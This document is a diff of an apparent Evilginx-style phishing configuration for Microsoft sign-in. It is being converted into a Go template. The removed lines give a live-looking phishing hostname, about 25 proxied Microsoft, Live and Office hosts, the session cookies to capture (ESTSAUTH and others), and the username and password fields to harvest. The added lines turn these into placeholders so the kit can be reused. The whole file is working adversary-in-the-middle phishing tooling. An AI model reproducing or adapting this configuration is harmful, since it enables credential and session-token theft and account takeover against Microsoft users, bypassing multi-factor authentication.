@@ -4,45 +4,45 @@
 # =============================================================================
 #
 # Placeholders (Go text/template):
-#   ycdjob6m .. o0861c4f   — unique random subdomain tokens
-#   login.glnt.cc                        — phishing hostname (e.g. "login.glnt.cc")
-#   login.microsoftonline.com                    — primary upstream (e.g. "login.microsoftonline.com")
-#   [ESTSAUTH ESTSAUTHPERSISTENT ESTSAUTHLIGHT SignInStateCookie]                  — array of session cookie names
-#   [loginfmt login email username]                  — array of username field names
-#   [passwd password Password secret]                  — array of password field names
+#   {{.PhishSub}} .. {{.PhishSub25}}   — unique random subdomain tokens
+#   {{.Hostname}}                        — phishing hostname (e.g. "login.glnt.cc")
+#   {{.UpstreamHost}}                    — primary upstream (e.g. "login.microsoftonline.com")
+#   {{.SessionCookies}}                  — array of session cookie names
+#   {{.UsernameFields}}                  — array of username field names
+#   {{.PasswordFields}}                  — array of password field names
 # =============================================================================
 
 author: "@Josh"
 min_ver: "3.9.9"
 name: "microsoft"
-server_name: "login.glnt.cc"
+server_name: "{{.Hostname}}"
 
 proxy_hosts:
-  - { phish_sub: "ycdjob6m", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "znxvymb5", orig_sub: "www", domain: "office.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "m3lrojn0", orig_sub: "account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "78oqtc9g", orig_sub: "privacynotice.account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: true }
-  - { phish_sub: "0x9let6m", orig_sub: "login", domain: "live.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "cv35reuz", orig_sub: "account", domain: "live.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "acefknyo", orig_sub: "outlook", domain: "live.com", session: true, is_landing: false }
-  - { phish_sub: "1dspptsr", orig_sub: "r4.res", domain: "office365.com", session: false, is_landing: false }
-  - { phish_sub: "jm2jxx0i", orig_sub: "", domain: "microsoftonline.com", session: true, is_landing: false }
-  - { phish_sub: "dt468pdn", orig_sub: "aadcdn", domain: "msauth.net", session: true, is_landing: false }
-  - { phish_sub: "i702r0s0", orig_sub: "aadcdn", domain: "msftauth.net", session: true, is_landing: false }
-  - { phish_sub: "fumass3q", orig_sub: "m365", domain: "msftauthimages.net", session: true, is_landing: false }
-  - { phish_sub: "ycj3vfay", orig_sub: "eu-mobile.events.data", domain: "microsoft.com", session: true, is_landing: false }
-  - { phish_sub: "e2xhsgmd", orig_sub: "res.public.onecdn", domain: "static.microsoft", session: true, is_landing: false }
-  - { phish_sub: "b5s8rc7q", orig_sub: "m365", domain: "cloud.microsoft", session: true, is_landing: false }
-  - { phish_sub: "3svckwaa", orig_sub: "substrate", domain: "office.com", session: true, is_landing: false }
-  - { phish_sub: "0d9rm6j4", orig_sub: "graph", domain: "microsoft.com", session: true, is_landing: false }
-  - { phish_sub: "wp9t2lh6", orig_sub: "admin", domain: "microsoft.com", session: true, is_landing: false }
-  - { phish_sub: "bq075yx7", orig_sub: "compass-ssl", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "0pyif4fo", orig_sub: "outlook", domain: "office.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "sav0dluy", orig_sub: "outlook", domain: "office365.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "ywiu6wok", orig_sub: "go", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "q1bgqwoj", orig_sub: "login", domain: "microsoft.com", session: true, is_landing: true, auto_filter: false }
-  - { phish_sub: "72pdcgjt", orig_sub: "browser.events.data", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "o0861c4f", orig_sub: "r4.res", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "{{.PhishSub}}", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "{{.PhishSub2}}", orig_sub: "www", domain: "office.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "{{.PhishSub3}}", orig_sub: "account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "{{.PhishSub4}}", orig_sub: "privacynotice.account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "{{.PhishSub5}}", orig_sub: "login", domain: "live.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "{{.PhishSub6}}", orig_sub: "account", domain: "live.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "{{.PhishSub7}}", orig_sub: "outlook", domain: "live.com", session: true, is_landing: false }
+  - { phish_sub: "{{.PhishSub8}}", orig_sub: "r4.res", domain: "office365.com", session: false, is_landing: false }
+  - { phish_sub: "{{.PhishSub9}}", orig_sub: "", domain: "microsoftonline.com", session: true, is_landing: false }
+  - { phish_sub: "{{.PhishSub10}}", orig_sub: "aadcdn", domain: "msauth.net", session: true, is_landing: false }
+  - { phish_sub: "{{.PhishSub11}}", orig_sub: "aadcdn", domain: "msftauth.net", session: true, is_landing: false }
+  - { phish_sub: "{{.PhishSub12}}", orig_sub: "m365", domain: "msftauthimages.net", session: true, is_landing: false }
+  - { phish_sub: "{{.PhishSub13}}", orig_sub: "eu-mobile.events.data", domain: "microsoft.com", session: true, is_landing: false }
+  - { phish_sub: "{{.PhishSub14}}", orig_sub: "res.public.onecdn", domain: "static.microsoft", session: true, is_landing: false }
+  - { phish_sub: "{{.PhishSub15}}", orig_sub: "m365", domain: "cloud.microsoft", session: true, is_landing: false }
+  - { phish_sub: "{{.PhishSub16}}", orig_sub: "substrate", domain: "office.com", session: true, is_landing: false }
+  - { phish_sub: "{{.PhishSub17}}", orig_sub: "graph", domain: "microsoft.com", session: true, is_landing: false }
+  - { phish_sub: "{{.PhishSub18}}", orig_sub: "admin", domain: "microsoft.com", session: true, is_landing: false }
+  - { phish_sub: "{{.PhishSub19}}", orig_sub: "compass-ssl", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "{{.PhishSub20}}", orig_sub: "outlook", domain: "office.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "{{.PhishSub21}}", orig_sub: "outlook", domain: "office365.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "{{.PhishSub22}}", orig_sub: "go", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "{{.PhishSub23}}", orig_sub: "login", domain: "microsoft.com", session: true, is_landing: true, auto_filter: false }
+  - { phish_sub: "{{.PhishSub24}}", orig_sub: "browser.events.data", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "{{.PhishSub25}}", orig_sub: "r4.res", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
 
 sub_filters:
   - { triggers_on: "account.microsoft.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
@@ -152,7 +152,7 @@ auth_tokens:
   - domain: '.microsoftonline.com'
     keys: ['.*,regexp,optional,always']
   - domain: 'login.microsoftonline.com'
-    keys:'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie'
+    keys:{{range $i, $c := .SessionCookies}}{{if $i}}, {{end}}'{{$c}}'{{end}}
     type: 'cookie'
   - domain: 'login.live.com'
     keys: ['MSPRequ', 'uaid']
@@ -202,16 +202,16 @@ auth_urls:
 
 credentials:
   username:
-    key: 'loginfmt|login|email|username'
+    key: '{{range $i, $f := .UsernameFields}}{{if $i}}|{{end}}{{$f}}{{end}}'
     search: '(.*)'
     type: "post"
   password:
-    key: 'passwd|password|Password|secret'
+    key: '{{range $i, $f := .PasswordFields}}{{if $i}}|{{end}}{{$f}}{{end}}'
     search: '(.*)'
     type: "post"
 
 login:
-  domain: "login.microsoftonline.com"
+  domain: "{{.UpstreamHost}}"
   path: "/"
 
 js_inject:
